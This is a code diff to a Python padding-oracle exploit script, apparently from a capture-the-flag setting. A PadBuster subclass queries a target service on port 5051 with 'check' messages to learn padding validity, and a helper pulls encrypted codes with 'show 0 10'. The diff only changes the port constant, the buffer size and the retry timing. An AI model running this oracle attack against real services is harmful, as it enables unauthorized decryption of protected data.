@@ -6,21 +6,24 @@ import time
 import logging
 import sys
 
+ADDRESS = 5051
 
 class PadBuster(PaddingOracle):
     def __init__(self, **kwargs):
         super(PadBuster, self).__init__(**kwargs)
-        self.address = (kwargs["address"], 5051)
+        self.address = (kwargs["address"], ADDRESS)
 
     def oracle(self, data, **kwargs):
         while 1:
             try:
+
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.connect(self.address)
                 self.sock.sendall("check {0}".format(data))
-                res = self.sock.recv(1488).strip(b"\x00").decode("utf-8")
+                res = self.sock.recv(1000).strip(b"\x00").decode("utf-8")
                 break
             except (socket.error):
+                time.sleep(1)
                 continue
         self.history.append(res)
         if res != "error":
@@ -31,11 +34,9 @@ class PadBuster(PaddingOracle):
 
 def get_codes(host):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("try to connect")
-    sock.connect((host, 1101))
-    print("connected")
+    sock.connect((host, ADDRESS))
     sock.sendall("show 0 10".encode())
-    res = sock.recv(1488).strip(b"\x00")
+    res = sock.recv(1000).strip(b"\x00")
     sock.close()
     return(res.split(b"separator"))
 
